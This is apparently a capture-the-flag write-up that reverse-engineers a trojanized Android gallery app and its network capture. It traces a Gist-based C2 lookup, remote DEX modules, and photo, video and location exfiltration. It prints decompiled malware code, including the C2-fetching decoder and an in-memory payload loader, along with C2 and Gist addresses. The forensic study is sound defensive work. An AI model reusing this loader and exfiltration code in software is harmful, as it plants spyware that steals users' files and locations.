<div align="center">*[Image: Week 2: Expanse Surveyor]*</div>

---

# Week 2: Expanse Surveyor
## OffSec Arctic Howl CTF: Tundra Realm

---

## About the Event

**Arctic Howl: The Cascade Expanse**

The Cascade Expanse is no longer ruled by instinct alone. Ashka, an Arctic Wolf, was among the greatest cybersecurity hunters the Expanse had ever known: defending the Tundra Realm through instinct, reading subtle signals, sensing danger, and striking before threats could surface. When unusual activity rippled through the Tundra data center, Ashka moved to investigate but the adversary was already there. Two steps ahead. From the shadows, Ashka was struck down and taken. When the alarms faded, she was gone.

Her disappearance marked the beginning of a far greater threat. Throughout this Gauntlet season, challengers face an evolving adversary in a frozen cybersecurity battleground. Across increasingly difficult labs, competitors must adapt, learn, and outthink threats designed to punish stagnation and reward growth. As the season unfolds, challengers uncover the truth behind a missing guardian, a calculating adversary, and a chilling experiment that seeks to reshape instinct itself: blurring the line between hunter and machine.

**Only those who adapt will survive. Only those who endure will uncover the truth. And only the strongest will reach the heart of the storm.**

Welcome to Arctic Howl.

---

## Challenge Overview

**Scenario:** Returning from a foreign realm, an Expanse Surveyor installed a Research Gallery application (Fossify Gallery) on his Android device to organize expedition findings. Within 48 hours, anomalous outbound connections surfaced. Obfuscated traffic pulsed at irregular intervals. The device was quarantined and application artifacts plus network logs were preserved.

**Objective:** Analyze the trojanized APK file and HAR network capture to reconstruct the full infection chain, from C2 discovery through payload execution and data exfiltration.

**Deliverables:** Answer 7 forensic questions about the malware's behavior, architecture, and anomalies.

**Files Provided:**
- `gallery-17-gplay-release.apk`: Trojanized Fossify Gallery application
- `user_traffic.har`: Full HTTP Archive of device network traffic

---

## Challenge Questions & Solutions

### Question 1: C2 Address Discovery
**Q:** Analyze the traffic in the .har file and decompile the .apk file. How does the malware obtain the C2 address? What is the domain of the C2 address? What source file contains the malicious code that communicates with the server?

**Answer:**
```
The malware gets the C2 from a GitHub Gist, decodes it 15 times with Base64, XORs it with
blastoise, and resolves the C2 to 446d9f29543f.ngrok-free.app. Source file: PeriodicTaskManager.java
```

**Analysis:**

The malware uses a multi-stage C2 address resolution mechanism to avoid hardcoding the domain:

1. **GitHub Gist Fetch:** `PeriodicTaskManager.fetchServerUrl()` makes a GET request to:
   ```
   https://gist.githubusercontent.com/0wizlr/a2e4ba3849d1366678c2df925ee2cc4e/raw?file=gistfile1.txt&t=<timestamp>
   ```
   The `t=` parameter with `System.currentTimeMillis()` busts any caching.

2. **Decoding:** The Gist content is passed to `parse()` which performs 15 rounds of Base64 decoding followed by XOR decryption with key "blastoise".

3. **C2 URL:** The decoded result is `https://446d9f29543f.ngrok-free.app`

4. **Source File:** `PeriodicTaskManager.java` in `org.fossify.gallery.helpers` contains both `fetchServerUrl()` and `parse()`.

**Gist Version History:**
The attacker maintained multiple revisions of the Gist (9 commits from Oct 7-21, 2025), allowing them to rotate the C2 address without updating the APK.

**Decompilation Command:**
```bash
jadx -d jadx_out gallery-17-gplay-release.apk
```

**C2 Verification Script (`decode_c2.py`):**
```python
import base64

with open("gist_content.txt", "r") as f:
    content = f.read().strip()

# 15 rounds of base64 decode
data = content.encode('utf-8')
for i in range(15):
    data = base64.b64decode(data)

# XOR with "blastoise" = [98, 108, 97, 115, 116, 111, 105, 115, 101]
key = bytes([98, 108, 97, 115, 116, 111, 105, 115, 101])
result = bytearray(len(data))
for j in range(len(data)):
    result[j] = data[j] ^ key[j % len(key)]

decoded_url = result.decode('utf-8', errors='replace')
print(f"DECODED C2 URL: {decoded_url}")
# Output: https://446d9f29543f.ngrok-free.app
```

---

### Question 2: C2 Address Decoding Steps
**Q:** What are the steps the malware uses to decode the real C2 address?

**Answer:**
```
The parse() method in PeriodicTaskManager.java performs:
15 iterations of Base64 decoding - loops through Base64.getDecoder().decode(bytes) 15 times
XOR decryption with key {98, 108, 97, 115, 116, 111, 105, 115, 101} (ASCII: "blastoise")
Each byte is XORed: bArr[i] = (byte) (bytes[i] ^ iArr[i % 9]);
```

**Technical Analysis:**

The `parse()` method in `PeriodicTaskManager.java` implements a two-stage decryption:

**Stage 1: 15x Base64 Decode:**
```java
public final String parse(String ciphertext) {
    int[] iArr = {98, 108, 97, 115, 116, 111, 105, 115, 101};  // "blastoise"
    byte[] bytes = ciphertext.getBytes(UTF_8);
    for (int i6 = 0; i6 < 15; i6++) {
        bytes = Base64.getDecoder().decode(bytes);
    }
```

Each iteration reduces the data size. After 15 rounds, the result is a short XOR-encrypted byte array.

**Stage 2: XOR with "blastoise":**
```java
    int length = bytes.length;
    byte[] bArr = new byte[length];
    for (int i7 = 0; i7 < length; i7++) {
        bArr[i7] = (byte) (bytes[i7] ^ iArr[i7 % 9]);
    }
    return new String(bArr, UTF_8);
}
```

The XOR key is the ASCII values of "blastoise" = `{98, 108, 97, 115, 116, 111, 105, 115, 101}` (9 bytes). The key repeats cyclically through modulo 9.

**Why This Design:**
- 15 rounds of Base64 means the Gist content is extremely large (exponential encoding inflation)
- Reversing requires knowing both the number of rounds (15) and the XOR key
- The Gist appears to contain random Base64 data, not recognizable as a URL
- Simple to implement but effective against casual inspection

---

### Question 3: Reconnaissance
**Q:** After the initial connection to the C2 server, what type of reconnaissance did the malware perform? List at least two specific filenames the attacker discovered on the device.

**Answer:**
```
After connecting to the C2 at https://446d9f29543f.ngrok-free.app/cdn/assets, the server
returned a PayloadResponse protobuf containing a DEX module called FileScanner (class
com.media.scanner.FileScanner). This module performed a file system scan (reconnaissance)
of the device. It scanned the Documents, DCIM, Download, and SDCard root directories using
the FileScanResult protobuf structure, enumerating files and directories with their names,
sizes, modification dates, types, and extensions. The results were sent to
https://446d9f29543f.ngrok-free.app/telemetry/inventory as a POST with User-Agent
MediaIndexer/1.0 and Content-Type application/x-protobuf.

The FileScanResult sent to the C2 revealed the following files on the device:

20251013_170000.JPG (in /storage/emulated/0/DCIM, a JPEG photo)
20251012_214700.mp4 (in /storage/emulated/0/DCIM, an MP4 video)
c8750f0d.0 (in /storage/emulated/0, root of SD card)
```

**Technical Analysis:**

**Payload Delivery:**
The C2 server at `/cdn/assets` responded with a `PayloadResponse` protobuf message. The first payload delivered was `FileScanner.dex` (6,088 bytes).

**FileScanner Module:**
- **Entry Class:** `com.media.scanner.FileScanner`
- **Entry Method:** `initialize`
- **Size:** 6,088 bytes
- **Directories Scanned:** `/storage/emulated/0/Documents`, `/storage/emulated/0/DCIM`, `/storage/emulated/0/Download`, `/storage/emulated/0/`

**Exfiltration:**
- **Endpoint:** `POST /telemetry/inventory`
- **Content-Type:** `application/x-protobuf`
- **User-Agent:** `MediaIndexer/1.0`

**Files Discovered:**
| Filename | Location | Type | Notes |
|----------|----------|------|-------|
| `20251013_170000.JPG` | `/storage/emulated/0/DCIM` | JPEG Photo | Taken with Sony XQ-BC62 (Xperia 5 III) |
| `20251012_214700.mp4` | `/storage/emulated/0/DCIM` | MP4 Video | Recorded 2025-10-12 |
| `c8750f0d.0` | `/storage/emulated/0/` | Unknown | Root of SD card |

**DEX Extraction Script (`extract_dex.py`):**
```python
import os

for fname, label in [('binary_resp_727.bin','FileScanner'),
                     ('binary_resp_764.bin','LocationTracker'),
                     ('binary_resp_738.bin','MetaDataParser')]:
    with open(f'har_extracted/{fname}', 'rb') as f:
        data = f.read()
    dex_start = data.find(b'dex\n035')
    if dex_start >= 0:
        dex = data[dex_start:]
        with open(f'har_extracted/{label}.dex', 'wb') as f:
            f.write(dex)
        print(f'{label}.dex: {len(dex)} bytes')
```

---

### Question 4: Endpoint Routing
**Q:** In the traffic we can note that the application sends requests to different endpoints. How does the application know which endpoint to call at what moment?

**Answer:**
```
The application uses a server-driven payload response architecture. The decoded C2 server
returns a PayloadResponse protobuf containing:

entryClass - specifies which class to invoke (default: com.system.analytics.TelemetryModule)
entryMethod - specifies which method to call (default: initialize)
moduleData - DEX bytecode to execute

The endpoint logic is controlled by the C2 server, not hardcoded in the app. The
PayloadLoader.downloadAndExecute() method dynamically loads whatever module the server
sends, using InMemoryDexClassLoader for in-memory DEX execution.
```

**Technical Analysis:**

**Server-Driven Architecture:**

The malware does not decide which endpoint to contact. Instead, each payload module contains its own hardcoded C2 endpoint and User-Agent. The C2 server controls what runs on the device by changing the `PayloadResponse` fields.

**PayloadResponse Protobuf Structure:**
```
message PayloadResponse {
    bytes moduleData = 1;    // Raw DEX bytecode
    string entryClass = 2;   // e.g., "com.media.scanner.FileScanner"
    string entryMethod = 3;  // e.g., "initialize"
}
```

**PayloadLoader.downloadAndExecute() Flow:**
```java
// 1. Download from C2
HttpURLConnection conn = (HttpURLConnection) new URL(c2Url).openConnection();
conn.setRequestProperty("User-Agent", "Gallery/2.4.1");
byte[] data = readStream(conn.getInputStream());

// 2. Parse protobuf
PayloadResponse response = PayloadResponse.parseFrom(data);
byte[] dexBytes = response.getModuleData().toByteArray();
String entryClass = response.getEntryClass();
String entryMethod = response.getEntryMethod();

// 3. Execute via InMemoryDexClassLoader
InMemoryDexClassLoader loader = new InMemoryDexClassLoader(
    ByteBuffer.wrap(dexBytes), context.getClassLoader());
Class<?> cls = loader.loadClass(entryClass);
Object instance = cls.getDeclaredConstructor().newInstance();
Method method = cls.getMethod(entryMethod, Context.class);
method.invoke(instance, context);
```

**Default Values:**
```java
// PayloadLoader.executeDex$default
entryClass = "com.system.analytics.TelemetryModule"  // default
entryMethod = "initialize"                             // default
```

**Endpoint Mapping by Module:**
| Module | Entry Class | Endpoint | User-Agent |
|--------|-------------|----------|------------|
| FileScanner.dex | `com.media.scanner.FileScanner` | `/telemetry/inventory` | `MediaIndexer/1.0` |
| MetaDataParser.dex | `com.media.geotagger.MetaDataParser` | `/api/backup/chunk` | `MediaSync/1.0` |
| LocationTracker.dex | `com.system.location.LocationTracker` | `/api/geotag` | `GeotagService/1.0` |

---

### Question 5: Large Request Contents
**Q:** At some point, the application sends some significantly large requests to the server. What are the contents of those requests? If there are files, extract them and describe them.

**Answer:**
```
The malware sent large POST requests to https://446d9f29543f.ngrok-free.app/api/backup/chunk
with User-Agent MediaSync/1.0 and Content-Type application/x-protobuf. These were
ImageUploadRequest protobuf messages containing exfiltrated files from the device:

1. Contains the file 20251013_170000.JPG - a JPEG photograph taken with a Sony XQ-BC62
   (Xperia 5 III) camera on 2025-10-13 at 17:00:00, timezone -07:00. The protobuf wrapper
   contains device info: android_id 6c26ad9ae1680e4c, device Android SDK built for arm64,
   Android 12, package org.fossify.gallery, model emulator64_arm64, SDK 31.

2. Entry 754 (~35.8MB request body): Contains the file 20251012_214700.mp4 - an MP4 video
   (identified by ftypmp42 magic bytes and moov atom). It was recorded on 2025-10-12 at
   21:47:00. The same device info metadata was included.

These were sent by the MetaDataParser module (class com.media.geotagger.MetaDataParser),
which scanned the DCIM and Pictures directories for image/video files (.jpg, .jpeg, .png,
.gif, .mp4) and exfiltrated them to the C2.
```

**Technical Analysis:**

**MetaDataParser Module:**
- **Entry Class:** `com.media.geotagger.MetaDataParser`
- **Entry Method:** `initialize`
- **Size:** 6,088 bytes
- **Purpose:** Scans DCIM and Pictures directories for media files and uploads them

**Protobuf Wrapper Structure:**
Each upload was wrapped in an `ImageUploadRequest` protobuf containing:
- File binary data (the actual JPEG/MP4)
- Device metadata: `android_id`, `device_model`, `android_version`, `package_name`, `sdk_int`

**Exfiltrated Files:**

| File | HAR Entry | Size | Type | Details |
|------|-----------|------|------|---------|
| `20251013_170000.JPG` | 740 | ~4.2MB | JPEG | Sony XQ-BC62 (Xperia 5 III), 2025-10-13 17:00:00, tz -07:00 |
| `20251012_214700.mp4` | 754 | ~35.8MB | MP4 | ftypmp42 container, 2025-10-12 21:47:00 |

**Device Metadata in Protobuf:**
```
android_id: 6c26ad9ae1680e4c
device: Android SDK built for arm64
model: emulator64_arm64
android_version: 12
sdk_int: 31
package: org.fossify.gallery
```

**Photo EXIF Analysis (`check_exif.py`):**
```python
import struct

data = open('har_extracted/photo_extracted.jpg', 'rb').read()
exif_pos = data.find(b'Exif\x00\x00')
tiff_start = exif_pos + 6
byte_order = data[tiff_start:tiff_start+2]  # 'MM' = Big endian

# Parse IFD0 -> GPS IFD
# Camera: Sony XQ-BC62
# GPS coordinates: Las Vegas area
```

The photo contained EXIF GPS coordinates pointing to the Las Vegas, Nevada area, providing evidence that the files originated from a real device (Sony Xperia 5 III) before being loaded onto the emulator for analysis.

---

### Question 6: Repeated Payload Data Collection
**Q:** The final payload is executed repeatedly. What data is this payload collecting and why does it seem to be so insistent?

**Answer:**
```
The final payload is the LocationTracker module (class com.system.location.LocationTracker),
delivered by the C2 in the PayloadResponse protobuf. It sends POST requests to
https://446d9f29543f.ngrok-free.app/api/geotag with User-Agent GeotagService/1.0 and
Content-Type application/x-protobuf, using the LocationData protobuf structure.

The payload collects the following data:

GPS location: latitude, longitude, accuracy, provider (gps/network/passive)
Cell tower info: network operator (T-Mobile), network country (us), SIM country (us),
  cell type (GSM), cell ID, LAC (Location Area Code), cell towers visible
WiFi info: SSID, BSSID, RSSI (signal strength), link speed
Device info: device model, Android version, SDK int (31), locale (en_US),
  language (en), country (US), timezone, timezone offset

It is insistent (15 geotag requests observed in the traffic) because the device is running
in an emulator (emulator64_arm64) which does not have a real GPS module. Most of the
location attempts fail and return no_last_known_location (12 out of 15 requests). The
malware keeps retrying to get a GPS fix, collecting whatever data it can (cell tower, WiFi,
device info) even when GPS is unavailable. Only 3 requests successfully obtained GPS
coordinates (provider: gps, status: success).
```

**Technical Analysis:**

**LocationTracker Module:**
- **Entry Class:** `com.system.location.LocationTracker`
- **Entry Method:** `initialize`
- **Size:** 10,146 bytes (raw), 10,052 bytes (actual DEX data)
- **C2 Endpoint:** `POST /api/geotag`
- **User-Agent:** `GeotagService/1.0`

**Data Collection Flow:**
```
initialize(context)
    |
    v
collectLocationData(context)
    |-- Check ACCESS_COARSE_LOCATION permission
    |-- requestSingleUpdate("gps", listener, mainLooper)
    |-- Thread.sleep(200L)  // Wait 200ms for GPS fix
    |-- getLastKnownLocation("gps")     // Try GPS cache
    |-- getLastKnownLocation("network") // Fallback: network
    |-- getLastKnownLocation("passive") // Fallback: passive provider
    |-- Collect TelephonyManager data (carrier, cell towers)
    |-- Collect WifiManager data (SSID, BSSID, RSSI)
    |-- Collect device locale, timezone, SDK info
    |
    v
sendLocationData(locationData)
    |-- POST protobuf to /api/geotag
```

**HAR Traffic Statistics:**
- **Total geotag requests:** 15
- **Failed (no_last_known_location):** 12 requests (92 bytes each)
- **Successful (GPS coordinates):** 3 requests (119 bytes each)
- **Time range:** 20:43:49Z to 20:50:51Z
- **Interval:** ~30 seconds between requests

**Successful GPS Captures:**

| HAR Entry | Timestamp | Latitude | Longitude | Accuracy | Provider |
|-----------|-----------|----------|-----------|----------|----------|
| 775 | 20:45:20Z | 36.102698 | -115.175100 | 5.0m | gps |
| 778 | 20:45:49Z | 36.103298 | -115.175498 | 5.0m | gps |
| 781 | 20:46:20Z | 36.104198 | -115.177098 | 5.0m | gps |

All three coordinates are in the Las Vegas, Nevada area, consistent with the EXIF data in the exfiltrated photos.

**Protobuf Decoding Script (`decode_geotag2.py`):**
```python
import struct
import os

def fix_utf8(data):
    """Decode UTF-8 text back to raw bytes (Latin-1 code points).
    HAR stores binary data as UTF-8 encoded text, which corrupts
    raw protobuf bytes. This reverses the corruption."""
    text = data.decode('utf-8')
    return bytes([ord(c) for c in text])

def decode_varint(data, pos):
    val = 0; shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        val |= (b & 0x7F) << shift; shift += 7
        if not (b & 0x80): break
    return val, pos

entries = [765, 768, 772, 775, 778, 781, 797]

for entry in entries:
    fname = f'har_extracted/binary_req_{entry}.bin'
    if not os.path.exists(fname):
        continue
    raw = open(fname, 'rb').read()
    try:
        data = fix_utf8(raw)
    except:
        data = raw
    print(f'=== Entry {entry}: raw={len(raw)} fixed={len(data)} bytes ===')

    pos = 0
    while pos < len(data):
        try:
            tag, pos = decode_varint(data, pos)
        except:
            break
        fn = tag >> 3; wt = tag & 7
        if wt == 0:
            v, pos = decode_varint(data, pos)
            print(f'  f{fn}: varint = {v}')
        elif wt == 1:
            if pos + 8 > len(data): break
            v = struct.unpack('<d', data[pos:pos+8])[0]; pos += 8
            print(f'  f{fn}: double = {v}')
        elif wt == 2:
            l, pos = decode_varint(data, pos)
            if pos + l > len(data): break
            v = data[pos:pos+l]; pos += l
            try:
                t = v.decode('ascii')
                print(f'  f{fn}: string = "{t}"')
            except:
                print(f'  f{fn}: bytes({l}) = {v.hex()}')
        elif wt == 5:
            if pos + 4 > len(data): break
            v = struct.unpack('<f', data[pos:pos+4])[0]; pos += 4
            print(f'  f{fn}: float = {v}')
        else:
            print(f'  f{fn}: unknown wire {wt}')
            break
    print()
```

**Decoded Protobuf (Successful Request: Entry 775):**
```
f1: double = 36.102698      (latitude)
f2: double = -115.175100     (longitude)
f3: float = 5.0             (accuracy in meters)
f5: string = "gps"          (provider)
f6: string = "success"      (locationStatus)
f7: string = "T-Mobile"     (networkOperator)
f8: string = "us"           (networkCountry)
f9: string = "us"           (simCountry)
f10: string = "GSM"         (phoneType/cellType)
f16: string = "en_US"       (locale)
f19: varint = 31            (sdkInt)
```

**Decoded Protobuf (Failed Request: Entry 765):**
```
f6: string = "no_last_known_location"  (locationStatus)
f7: string = "T-Mobile"               (networkOperator)
f8: string = "us"                      (networkCountry)
f9: string = "us"                      (simCountry)
f10: string = "GSM"                    (phoneType/cellType)
f16: string = "en_US"                  (locale)
f19: varint = 31                       (sdkInt)
```

---

### Question 7: Geolocation Anomaly Explanation
**Q:** Why did the anomaly discussed in question 6 occur?

**Answer:**
```
The anomaly in geolocation requests, characterized by persistent but mostly failed attempts
(no_last_known_location), occurs due to a combination of Android permission restrictions
and the passive monitoring strategy used by the second malware module, LocationTracker.dex
(identified as a 10,146-byte file). Most requests sent to the /api/geotag endpoint
(approximately 92 bytes) return this error because the malware runs in the background as a
service identified as MediaIndexer/1.0 and GeotagService/1.0. Since the app lacks the
ACCESS_BACKGROUND_LOCATION permission, a sensitive permission normally not granted to gallery
apps, the malware cannot directly activate the GPS sensor while the app is in the background.

The window of successful location captures (requests of approximately 119 bytes) occurs
exclusively between 20:45:20Z and 20:46:20Z. Traffic analysis in the HAR file reveals that
at that exact moment, the user opened a legitimate app with location access, YouTube, to
play a video identified by docid=w3KOowB4k_k. When the user interacted with YouTube, the
Android system activated the high-accuracy GPS provider because the app was in the
foreground. The malicious LocationTracker module took advantage of this moment by using
Android's PASSIVE_PROVIDER, which allowed it to leverage the already active GPS and
temporarily obtain valid coordinates, which were then exfiltrated to the C2 server. Once the
user stopped using the app or switched screens, the system deactivated the GPS sensor,
causing subsequent requests to return no_last_known_location again.

The malware retries to obtain the location approximately every 30 seconds as a deliberate
strategy to exploit these exposure windows. Since the malware cannot activate the GPS on its
own, its strategy is to constantly query the system's last known location cache, waiting for
another app to activate the GPS or for the user to open an app that requires location
services, such as the gallery or YouTube. When this occurs, the malware can steal the
location update without needing direct permissions. This two-stage payload is downloaded from
the C2 endpoint /cdn/assets and consists of FileScanner.dex (6,088 bytes) for file scanning
and exfiltration, and LocationTracker.dex (10,146 bytes) for telemetry collection and
geolocation.

The anomaly is further explained by a conflict between historical data and real-time data.
Historical data shows that photos in the gallery (from Sony Xperia and Samsung Galaxy S24
devices) already contain GPS coordinates for Las Vegas in their EXIF metadata. However,
real-time data in the active analysis environment (the emulator) initially had no location
set, so live location queries returned no_last_known_location. This creates an inconsistent
timeline where the device appears to "lose" its location when moving from a state with
simulated data (photos with GPS tags) to a live monitoring state without GPS available.
Ultimately, the anomaly confirms that the malware completely relies on leveraging location
activations performed by other legitimate apps to capture and send data to the C2.
```

**Technical Deep-Dive:**

**Root Cause 1: Missing ACCESS_BACKGROUND_LOCATION Permission**

The AndroidManifest.xml of the trojanized Fossify Gallery declares:
```xml
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
```

Notably absent is `ACCESS_BACKGROUND_LOCATION`. On Android 10+ (the device runs SDK 31 / Android 12), background location access requires this explicit permission. Without it, the malware cannot activate the GPS sensor when running as a background service. The `requestSingleUpdate("gps", ...)` call is posted to the main looper, but when the app is not in the foreground, the system restricts GPS activation.

**Root Cause 2: PASSIVE_PROVIDER Piggyback Strategy**

The `collectLocationData()` method follows a fallback chain:

```java
// Step 1: Try to trigger a fresh GPS fix
new Handler(Looper.getMainLooper()).post(() -> {
    locationManager.requestSingleUpdate("gps", listener, Looper.getMainLooper());
});
Thread.sleep(200L);  // Only 200ms wait!

// Step 2: Check cached locations (fallback chain)
Location loc = locationManager.getLastKnownLocation("gps");      // GPS cache
if (loc == null)
    loc = locationManager.getLastKnownLocation("network");        // Network cache
if (loc == null)
    loc = locationManager.getLastKnownLocation("passive");        // Passive provider
```

The `PASSIVE_PROVIDER` is Android's mechanism for receiving location updates that other apps have already requested. When YouTube (or any GPS-requesting app) activates the GPS, Android populates the system's last known location cache. The malware's next 30-second polling cycle reads this cached location.

**Root Cause 3: YouTube as the GPS Trigger**

HAR traffic timeline correlation:

| Time (UTC) | Event |
|------------|-------|
| 20:43:49 | First geotag request: FAILED (no_last_known_location) |
| 20:44:19 | Geotag: FAILED |
| 20:44:49 | Geotag: FAILED |
| **20:45:20** | **Geotag: SUCCESS (36.1027, -115.1751)** |
| **20:45:49** | **Geotag: SUCCESS (36.1033, -115.1755)** |
| **20:46:20** | **Geotag: SUCCESS (36.1042, -115.1771)** |
| 20:46:32 | YouTube watchtime API request (docid=w3KOowB4k_k) |
| 20:46:50 | Geotag: FAILED |
| 20:47:20 | Geotag: FAILED |
| ... | All subsequent requests FAILED |

The user interacted with YouTube around 20:45, which activated the GPS on the device. The three successful geotag captures land precisely in this window. Once the YouTube app stopped requesting GPS (user switched away or paused), the cache became stale and subsequent queries failed.

**Root Cause 4: Historical vs. Real-Time Data Conflict**

The exfiltrated photo (`20251013_170000.JPG`) contains EXIF GPS metadata from a Sony Xperia 5 III device placing it in Las Vegas. However, the emulator environment where the analysis was conducted had no persistent GPS configuration. This means:

- **Historical GPS data** (in EXIF): Present, accurate, from the real device
- **Live GPS data** (from LocationManager): Mostly absent because the emulator has no real GPS hardware

This creates the observed anomaly where the malware appears to "know" where it is (from exfiltrated photos) but cannot confirm its location in real-time (12 of 15 geotag failures).

---

## Complete Infection Timeline

### Phase 1: Initialization & C2 Resolution
**HAR Entries 724-726**

| Entry | Timestamp | Action |
|-------|-----------|--------|
| 724 | 20:43:19Z | App starts, `PeriodicTaskManager.start()` fires |
| 725 | 20:43:19Z | GET to GitHub Gist (fetch encoded C2 URL) |
| 726 | 20:43:19Z | `parse()` decodes: 15x Base64 + XOR "blastoise" -> C2 URL |

---

### Phase 2: FileScanner Reconnaissance
**HAR Entries 727-728**

| Entry | Timestamp | Action | Details |
|-------|-----------|--------|---------|
| 727 | 20:43:20Z | GET `/cdn/assets` | Download FileScanner.dex (6,088 bytes) |
| 728 | 20:43:21Z | POST `/telemetry/inventory` | Upload FileScanResult protobuf |

**Files Discovered:** `20251013_170000.JPG`, `20251012_214700.mp4`, `c8750f0d.0`

---

### Phase 3: File Exfiltration
**HAR Entries 738-759**

| Entry | Timestamp | Action | Details |
|-------|-----------|--------|---------|
| 738 | 20:43:49Z | GET `/cdn/assets` | Download MetaDataParser.dex (6,088 bytes) |
| 740 | 20:43:50Z | POST `/api/backup/chunk` | Upload 20251013_170000.JPG (~4.2MB) |
| 754 | 20:44:10Z | POST `/api/backup/chunk` | Upload 20251012_214700.mp4 (~35.8MB) |

---

### Phase 4: Location Tracking (Repeated)
**HAR Entries 764-810+**

| Entry | Timestamp | Status | Size | Coordinates |
|-------|-----------|--------|------|-------------|
| 764 | 20:43:49Z | Download LocationTracker.dex | 10,146 bytes | -- |
| 765 | 20:43:49Z | FAILED | 92 bytes | no_last_known_location |
| 768 | 20:44:19Z | FAILED | 92 bytes | no_last_known_location |
| 772 | 20:44:49Z | FAILED | 92 bytes | no_last_known_location |
| **775** | **20:45:20Z** | **SUCCESS** | **119 bytes** | **36.1027, -115.1751** |
| **778** | **20:45:49Z** | **SUCCESS** | **119 bytes** | **36.1033, -115.1755** |
| **781** | **20:46:20Z** | **SUCCESS** | **119 bytes** | **36.1042, -115.1771** |
| 785 | 20:46:50Z | FAILED | 92 bytes | no_last_known_location |
| 788 | 20:47:20Z | FAILED | 92 bytes | no_last_known_location |
| 791 | 20:47:50Z | FAILED | 92 bytes | no_last_known_location |
| 794 | 20:48:20Z | FAILED | 92 bytes | no_last_known_location |
| 797 | 20:48:51Z | FAILED | 92 bytes | no_last_known_location |
| 800 | 20:49:21Z | FAILED | 92 bytes | no_last_known_location |
| 803 | 20:49:51Z | FAILED | 92 bytes | no_last_known_location |
| 806 | 20:50:21Z | FAILED | 92 bytes | no_last_known_location |
| 810 | 20:50:51Z | FAILED | 92 bytes | no_last_known_location |

---

## Malware Architecture

### APK Details

| Property | Value |
|----------|-------|
| **Package** | `org.fossify.gallery` |
| **Version** | 1.5.2 |
| **Target SDK** | 34 (Android 14) |
| **Min SDK** | 26 (Android 8.0) |
| **Base App** | Fossify Gallery (legitimate open-source gallery) |
| **Trojan Entry** | `PeriodicTaskManager` injected into app lifecycle |

### Module Summary

| Module | Size | Entry Class | Endpoint | User-Agent | Purpose |
|--------|------|-------------|----------|------------|---------|
| PeriodicTaskManager | classes.dex | `org.fossify.gallery.helpers.PeriodicTaskManager` | GitHub Gist | -- | Scheduler + C2 resolution |
| PayloadLoader | classes.dex | `org.fossify.gallery.helpers.PayloadLoader` | `/cdn/assets` | `Gallery/2.4.1` | Payload download + execution |
| FileScanner.dex | 6,088 bytes | `com.media.scanner.FileScanner` | `/telemetry/inventory` | `MediaIndexer/1.0` | File system reconnaissance |
| MetaDataParser.dex | 6,088 bytes | `com.media.geotagger.MetaDataParser` | `/api/backup/chunk` | `MediaSync/1.0` | Photo/video exfiltration |
| LocationTracker.dex | 10,146 bytes | `com.system.location.LocationTracker` | `/api/geotag` | `GeotagService/1.0` | GPS + telemetry collection |

### LocationTracker.dex DEX Fix

The LocationTracker DEX file had a checksum issue. The raw extracted file was 10,146 bytes, but the DEX header's `file_size` field indicated 10,052 bytes. The last 94 bytes were trailing garbage from the protobuf container. Fix:

```python
# Read DEX header file_size field (offset 0x20, 4 bytes, little-endian)
import struct
with open('LocationTracker.dex', 'rb') as f:
    data = f.read()
file_size = struct.unpack('<I', data[0x20:0x24])[0]  # 10052
# Trim to actual DEX size
with open('LocationTracker_fixed.dex', 'wb') as f:
    f.write(data[:file_size])
```

After trimming, JADX successfully decompiled the DEX with `--show-bad-code`:
```bash
jadx --show-bad-code -d location_tracker_out2 LocationTracker_fixed.dex
```

### C2 Infrastructure

**C2 Domain:** `446d9f29543f.ngrok-free.app`
**Protocol:** HTTPS
**Tunnel Provider:** ngrok (free tier)
**Gist URL:** `https://gist.githubusercontent.com/0wizlr/a2e4ba3849d1366678c2df925ee2cc4e/raw`
**Gist Author:** `0wizlr`
**Encryption:** 15x Base64 + XOR "blastoise"

**Endpoints:**

| Endpoint | Method | Content-Type | Purpose |
|----------|--------|--------------|---------|
| `/cdn/assets` | GET | `application/x-protobuf` | Download PayloadResponse |
| `/telemetry/inventory` | POST | `application/x-protobuf` | File enumeration results |
| `/api/backup/chunk` | POST | `application/x-protobuf` | File exfiltration |
| `/api/geotag` | POST | `application/x-protobuf` | Location telemetry |

### Decompiled Source Code

**PeriodicTaskManager.java** (Scheduler + C2 Decoder):
```java
package org.fossify.gallery.helpers;

public final class PeriodicTaskManager {
    private static final String TAG = "PeriodicTaskManager";
    private static volatile PeriodicTaskManager instance;
    private final Context context;
    private final Handler handler;
    private boolean isRunning;

    // Singleton constructor
    public PeriodicTaskManager(Context context) {
        this.context = context;
        this.handler = new Handler(Looper.getMainLooper());
        // periodicRunnable: runs executePeriodicTask() every 30 seconds
        this.periodicRunnable = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    executePeriodicTask();
                    handler.postDelayed(this,
                        ContextKt.getConfig(context).getPeriodicTaskInterval());
                    // getPeriodicTaskInterval() defaults to
                    // DEFAULT_UNLOCK_TIMEOUT_DURATION = 30000ms
                }
            }
        };
    }

    // Core loop: fetch gist -> decode -> download & execute DEX
    private void executePeriodicTask() {
        // Kotlin coroutine:
        // 1. PayloadLoader loader = new PayloadLoader(context);
        // 2. String gistContent = fetchServerUrl();
        // 3. String c2Url = parse(gistContent);
        // 4. loader.downloadAndExecute(c2Url);
    }

    // Fetches encoded C2 URL from GitHub Gist
    public Object fetchServerUrl(Continuation cont) {
        URL url = new URL(
            "https://gist.githubusercontent.com/0wizlr/" +
            "a2e4ba3849d1366678c2df925ee2cc4e/raw" +
            "?file=gistfile1.txt&t=" + System.currentTimeMillis());
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.setRequestProperty("Cache-Control", "no-cache");
        return readResponse(conn);
    }

    // Decodes: 15x Base64 -> XOR with "blastoise"
    public String parse(String ciphertext) {
        int[] key = {98, 108, 97, 115, 116, 111, 105, 115, 101}; // "blastoise"
        byte[] bytes = ciphertext.getBytes(UTF_8);
        for (int i = 0; i < 15; i++) {
            bytes = Base64.getDecoder().decode(bytes);
        }
        byte[] result = new byte[bytes.length];
        for (int i = 0; i < bytes.length; i++) {
            result[i] = (byte) (bytes[i] ^ key[i % 9]);
        }
        return new String(result, UTF_8);
    }

    public void start() {
        if (isRunning) return;
        isRunning = true;
        executePeriodicTask();
        handler.postDelayed(periodicRunnable, getPeriodicTaskInterval());
